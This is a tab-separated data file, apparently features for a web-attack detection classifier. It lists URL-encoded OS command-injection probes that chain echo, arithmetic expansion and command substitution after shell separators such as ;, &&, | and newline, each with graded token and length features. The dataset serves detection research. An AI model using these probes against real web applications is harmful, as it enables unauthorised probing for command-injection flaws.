attack	d_char	d_token_sqli	d_token_xss	d_token_ci	punck	s_token	space	length	output
echo%20agiymz$((69%2b52))$(echo%20agiymz)agiymz	M	L	L	L	M	M	L	M	
%20echo%20tdjhry$((30%2b41))$(echo%20tdjhry)tdjhry	M	L	L	L	M	M	L	M	
;echo%20mpcsbg$((54%2b42))$(echo%20mpcsbg)mpcsbg	M	L	L	L	M	M	L	M	
&echo%20nwmzcf$((57%2b72))$(echo%20nwmzcf)nwmzcf	M	L	L	L	M	M	L	M	
&&echo%20pvjxos$((12%2b1))$(echo%20pvjxos)pvjxos	M	L	L	L	M	M	L	M	
%0aecho%20vvieoj$((30%2b78))$(echo%20vvieoj)vvieoj	M	L	L	L	M	M	L	M	
%3becho%20srpjet$((29%2b34))$(echo%20srpjet)srpjet	M	L	L	L	M	M	L	M	
%26echo%20nqpwbv$((16%2b77))$(echo%20nqpwbv)nqpwbv	M	L	L	L	M	M	L	M	
%26%26echo%20qozrfb$((19%2b4))$(echo%20qozrfb)qozrfb	M	L	L	L	M	M	L	M	
echo%20ifnpxi$((40%2b99))$(echo%20ifnpxi)ifnpxi'	M	L	L	L	M	M	L	M	
%20echo%20hbfeem$((46%2b2))$(echo%20hbfeem)hbfeem'	M	L	L	L	M	M	L	M	
;echo%20khmfrs$((69%2b67))$(echo%20khmfrs)khmfrs'	M	L	L	L	M	M	L	M	
&echo%20dacxmn$((57%2b35))$(echo%20dacxmn)dacxmn'	M	L	L	L	M	M	L	M	
|echo%20ddljjw$((33%2b23))$(echo%20ddljjw)ddljjw'	M	L	L	L	M	M	L	M	
||echo%20xiyaua$((17%2b90))$(echo%20xiyaua)xiyaua'	M	L	L	L	M	M	L	M	
&&echo%20cmmotv$((30%2b10))$(echo%20cmmotv)cmmotv'	M	L	L	L	M	M	L	M	
%0aecho%20vkwheh$((83%2b36))$(echo%20vkwheh)vkwheh'	M	L	L	L	M	M	L	M	
%3becho%20rdkwwc$((22%2b44))$(echo%20rdkwwc)rdkwwc'	M	L	L	L	M	M	L	M	
